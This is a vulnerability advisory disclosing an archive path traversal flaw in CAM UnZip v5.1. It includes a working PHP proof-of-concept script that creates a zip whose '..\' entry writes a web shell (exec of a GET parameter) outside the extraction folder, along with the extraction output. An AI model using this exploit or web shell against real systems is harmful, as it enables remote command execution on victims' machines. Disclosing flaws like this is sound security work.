@@ -1,0 +1,103 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/CAMUNZIP-ARCHIVE-PATH-TRAVERSAL.txt
+
+
+Vendor:
+=================
+www.camunzip.com
+
+
+Product:
+==============
+CAM UnZip v5.1
+
+
+Vulnerability Type:
+======================
+Archive Path Traversal
+
+
+CVE Reference:
+==============
+N/A
+
+
+Vulnerability Details:
+=====================
+
+CAM UnZip fails to check that the paths of the files in the archive do not
+engage in path traversal when uncompressing the archive files.
+specially crafted files in the archive containing '..\' in file name can
+overwrite files on the filesystem by backtracking or allow attackers
+to place malicious files on system outside of the target unzip directory
+which may lead to remote command execution exploits etc...
+
+Tested successfully Windows 7
+
+
+Exploit code(s):
+===============
+
+malicious archive script...
+
+
+<?php
+#CAM UnZip v5.1
+#directory traversal to remote code execution exploit
+#====================================================
+
+if($argc<2){echo "Usage: <filename>";exit();}
+$file_name=$argv[1];
+
+$zip = new ZipArchive();
+$res = $zip->open("$file_name.zip", ZipArchive::CREATE);
+$zip->addFromString("..\..\..\..\..\..\..\..\RCE.php", '<?php
+exec($_GET["cmd"]); ?>');
+$zip->close();
+
+echo "Malicious archive created...\r\n";
+echo "========= hyp3rlinx ============";
+?>
+
+/////////////////////////////////////////////////////////////////////////////////////
+
+Result:
+
+Creating Folder: C:\Test\BOZO
+
+Extracting Files From: C:\Test\BOZO.zip
+
+Unzipped file C:\Test\BOZO\..\..\..\..\..\..\..\..\RCE.php of size 28
+
+1 file was Extracted.
+
+C:\RCE.php
+
+
+
+
+Exploitation Technique:
+=======================
+Local
+
+
+Severity Level:
+================
+Medium
+
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+hyp3rlinx
